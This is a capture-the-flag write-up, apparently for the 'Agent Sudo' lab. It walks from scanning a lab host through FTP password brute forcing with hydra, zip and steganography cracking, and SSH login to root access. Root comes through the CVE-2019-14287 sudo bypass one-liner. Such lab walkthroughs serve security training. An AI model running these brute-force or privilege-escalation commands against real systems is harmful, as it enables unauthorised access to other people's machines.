# Agent Sudo

- Run nmap: there is ftp, ssh and http running on the server
- The web pages asks to change the user agent to C
- On changing the user agent we found a text from agent R to user chris.
- Used hydra to brute force ftp password. Password `crystal`
```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.223.28 | tee hyra.log
```
- Connect to the FTP server and download everything using command `mget *`
- On running strings on cutie.png found a file name.
- Used `binwalk -e cutie.png` to extract the data.
- The file `To_agentR.txt` was empty but there was another zip with password
- Used john the ripper to get the password
```
zip2john 8702.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
- Password is alien
- Found the steghide password in base64 in the To_agentR file: `Area51`
```
steghide extract -sf cute-alient.jpg
```
- Found the username and password for ssh: `james` & `hackerrules!`
- Login as james with ssh and transfer the linpeas.sh to the server.
- Found the sudo version to be 1.8.21p2 which is vulnerable to CVE-2019-14287
```
sudo -u#-1 /bin/bash
```
- Got the root access